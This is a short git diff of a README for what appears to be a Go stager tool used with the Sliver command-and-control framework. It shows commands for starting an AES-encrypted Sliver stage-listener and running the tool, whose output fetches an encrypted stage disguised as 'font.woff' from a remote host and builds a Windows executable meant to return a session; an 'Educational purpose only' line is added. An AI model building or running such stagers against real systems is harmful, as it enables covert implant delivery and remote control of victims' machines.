@@ -2,20 +2,17 @@
 
 Have your sliver's http(s) stage-listener ready like this:
 ```
-sliver> stage-listener
-
-
+sliver> stage-listener -u https://example.com:443 --aes-encrypt-key <key> --aes-encrypt-iv <iv> -p <your implant profile>
 ```
 
 Run this project with the url and aes key
 ```
-go run main.go
+go run . -u https://example.com -k <key>
+
+[+] Request: https://example.com/font.woff
+[+] AES Key: <key>
+[+] Binary : out/out.exe
+
 ```
 
-Pass the generated binary to Windows and see if you get a session back
-
-
-
-
-
-
+> Educational purpose only
